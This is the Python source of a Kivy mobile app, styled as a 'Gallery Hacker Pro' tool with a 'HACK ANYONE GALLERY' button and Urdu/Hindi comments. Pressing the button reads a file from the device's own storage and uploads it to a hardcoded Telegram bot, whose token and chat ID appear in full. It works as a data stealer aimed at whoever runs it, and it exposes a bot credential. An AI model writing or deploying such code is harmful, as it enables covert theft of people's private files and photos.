from kivy.config import Config
# Fullscreen setting for professional hacker look
Config.set('graphics', 'fullscreen', 'auto')
Config.set('graphics', 'window_state', 'maximized')

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.lang import Builder
from kivy.core.window import Window
import requests
import threading
import os

# Pure Black Background
Window.clearcolor = (0, 0, 0, 1)

KV = '''
<HackerButton@Button>:
    font_size: '22sp'
    markup: True
    size_hint: (0.85, 0.12)
    background_normal: ''
    background_color: (0, 0.2, 0, 1) # Dark Green
    color: (0, 1, 0, 1) # Neon Green
    canvas.before:
        Color:
            rgba: (0, 1, 0, 0.8) # Neon Border
        Line:
            width: 2.5
            rectangle: (self.x, self.y, self.width, self.height)

FloatLayout:
    # Header
    Label:
        text: "[b][color=#00ff00]S Y S T E M _ O V E R R I D E[/color][/b]"
        markup: True
        pos_hint: {'center_x': 0.5, 'top': 0.96}
        font_size: '20sp'

    # Buttons Section
    BoxLayout:
        orientation: 'vertical'
        size_hint: (1, 0.35)
        pos_hint: {'center_x': 0.5, 'y': 0.05}
        spacing: 25
        padding: 20

        HackerButton:
            text: "[b]HACK ANYONE GALLERY[/b]"
            on_press: app.start_transfer_thread()

        HackerButton:
            text: "[b][color=#ff0000]TERMINATE SESSION[/color][/b]"
            background_color: (0.3, 0, 0, 1)
            on_press: app.stop()
'''

class HackerApp(App):
    # Aapka Faraham karda Data
    BOT_TOKEN = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA"
    CHAT_ID = "7107389141"

    def build(self):
        self.title = "Gallery Hacker Pro"
        return Builder.load_string(KV)

    def start_transfer_thread(self):
        # Threading taake App hang na ho
        # Testing ke liye /sdcard/ se koi file path dein
        target_file = "/sdcard/Download/test.jpg" 
        
        threading.Thread(target=self.send_data, args=(target_file,)).start()

    def send_data(self, file_path):
        url = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendDocument"
        
        try:
            # Check if file exists before sending
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    payload = {'chat_id': self.CHAT_ID, 'caption': "⚡ Alert: Data Received!"}
                    files = {'document': f}
                    
                    # Connection using requests
                    response = requests.post(url, data=payload, files=files, timeout=20)
                    
                    if response.status_code == 200:
                        print("✅ Success: Telegram par data chala gaya.")
                    else:
                        print(f"❌ Error Code: {response.status_code}")
            else:
                # Agar file nahi milti toh simple message bhej dein testing ke liye
                msg_url = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendMessage"
                requests.post(msg_url, data={'chat_id': self.CHAT_ID, 'text': "⚠️ Button Pressed! (File not found at path)"})
                print("⚠️ File not found, notification sent.")

        except Exception as e:
            print(f"🌐 Network Error: {e}")

if __name__ == "__main__":
    HackerApp().run()
